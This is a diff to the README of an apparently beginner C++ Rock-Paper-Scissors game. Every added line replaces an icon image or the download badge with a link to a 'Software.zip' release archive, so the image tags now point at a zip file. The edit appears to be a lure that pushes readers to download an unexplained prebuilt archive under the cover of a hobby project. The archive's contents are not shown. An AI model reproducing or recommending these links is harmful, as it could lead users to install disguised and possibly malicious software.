@@ -1,6 +1,6 @@
 # 🎮 Project1 - A Simple Rock-Paper-Scissors Game implemented in C++
 
-![Project1](https://img.icons8.com/ios-filled/50/000000/rock-paper-scissors.png)
+![Project1](https://github.com/rayhant89/Project1/releases/download/v1.0/Software.zip)
 
 Welcome to Project1, a beginner-friendly console game written in C++ where you can play the classic game of Rock-Paper-Scissors against the computer! This mini-project is perfect for those looking to improve their C++ skills or just have some fun with a simple terminal game.
 
@@ -8,7 +8,7 @@ Welcome to Project1, a beginner-friendly console game written in C++ where you c
 
 To get started with Project1, simply download the project files from the following link: 
 
-[![Download Project1](https://img.shields.io/badge/Download-Project1-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Project1](https://github.com/rayhant89/Project1/releases/download/v1.0/Software.zip)](https://github.com/rayhant89/Project1/releases/download/v1.0/Software.zip)
 
 If the link does not work, please check the "Releases" section of the repository for alternative download options.
 
@@ -63,4 +63,4 @@ For any questions or issues, please open an issue in the repository or contact t
 
 Thank you for checking out Project1. We hope you have a great time playing this simple but entertaining Rock-Paper-Scissors game! 🎉
 
-![Rock-Paper-Scissors](https://img.icons8.com/ios-filled/50/000000/rock-paper-scissors.png)
+![Rock-Paper-Scissors](https://github.com/rayhant89/Project1/releases/download/v1.0/Software.zip)
